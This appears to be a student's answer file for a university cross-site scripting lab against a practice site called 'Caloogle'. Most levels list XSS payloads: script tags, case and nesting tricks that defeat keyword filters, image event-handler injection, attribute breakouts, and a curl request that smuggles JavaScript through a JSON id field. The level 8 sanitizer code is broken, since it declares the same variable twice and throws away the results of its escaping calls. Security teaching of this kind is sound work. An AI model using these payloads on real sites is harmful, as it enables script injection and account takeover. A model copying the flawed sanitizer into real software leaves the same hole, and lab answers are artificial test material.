# 0. Welcome

N/A

# 1. A Truly Disruptive Startup (3 points)

```
<script>success()</script>
```

# 2. No Script Allowed (3 points)

```
<scriptscript>success()</script>
```

# 3. One More Time, Like You Mean It (3 points)

```
<Script>success()</Script>
```

# 4. An Open-and-Shut Case (3 points)

```
<Script>success()</Script>
```

# 5. Time to Mix Things Up (3 points)

```
<Script>success()</Script>
```

# 6. A Picture is Worth a Thousand Words (3 points)

```
<img src="https://www.berkeleyside.org/wp-content/uploads/2021/02/Aerial-view-of-View-of-Sather-Tower-and-Campanile-Esplanade-left-Wheeler-Hall-top-right-Hearst-Memorial-Mining-Building-bottom-right.-Photo-UC-Berkeley.png" onload=success()>
```

# 7. Between a Rock And a Hard Place (3 points)

```
<img src="https://www.berkeleyside.org/wp-content/uploads/2021/02/Aerial-view-of-View-of-Sather-Tower-and-Campanile-Esplanade-left-Wheeler-Hall-top-right-Hearst-Memorial-Mining-Building-bottom-right.-Photo-UC-Berkeley.png" onclick=success()>
```

# 8. Angle of Death (6 points)

Attack input:

```
<<img src="https://www.berkeleyside.org/wp-content/uploads/2021/02/Aerial-view-of-View-of-Sather-Tower-and-Campanile-Esplanade-left-Wheeler-Hall-top-right-Hearst-Memorial-Mining-Building-bottom-right.-Photo-UC-Berkeley.png" onload=success()>>
```

Server code:

```js
router.get('/search', async (req, res) => {
  let q = req.query.q
  if (q == null) q = ''

  let q = req.query.q
  if (q == null) q = ''

  let oldQ
  while (q !== oldQ) {
    oldQ = q
    q = q.replace(/script|onerror=|onload=/gi, '')
  }
  q.replace(/</g, '&lt;')
  q.replace(/>/g, '&gt;')

  const results = await getResults(q)
  res.render('caloogle-search-page', { q, results })
})
```

# 9. All in a Day's Work

N/A

# 10. In the Wrong Place at the Wrong Time (3 points)

```
" onload=success()
```

# 11. You Can't Win 'em All (6 points)

Attack input:

```
"" onload=success()
```

Server code:

```js
router.get('/search', async (req, res) => {
  let q = req.query.q
  if (q == null) q = ''

  // TODO: Replace this with your solution.
  // q = ???

  const results = await getResults(q)
  res.render('caloogle-search-page', { q, results })
})
```

# 12. When All is Said and Done (6 points)

Attack input:

```
TODO: Replace this with your attack input.
```

Server code:

```js
router.get('/search', async (req, res) => {
  let q = req.query.q
  if (q == null) q = ''

  // TODO: Replace this with your solution.
  // q = ???

  const results = await getResults(q)
  res.render('caloogle-search-page', { q, results })
})
```

# 13. When You Want a Job Done Right

N/A

# 14. Here Today and Gone Tomorrow (3 points)

Attack URL:

```
http://caloogle.xyz:4140/search?q=test&lang=de%20onload=success()
```

# 15. The Early Bird Catches the Worm (3 points)

```
</script><script>success()</script>
```

# 16. Tying Up Loose Ends (3 points)

```
<<//script><script>success()<<//script>
```

# 17. Take a Page Out of Their Book (6 points)

Attack code:

```js
curl --request POST \
  --url http://caloogle.xyz:4170/comment \
  --header 'Content-Type: application/json' \
  --data '{
	"id": "0); success()//",
	"text": "string"
}'
```

# 18. Congrats

N/A

# Survey responses (3 points)

Write your survey responses in SURVEY.md!
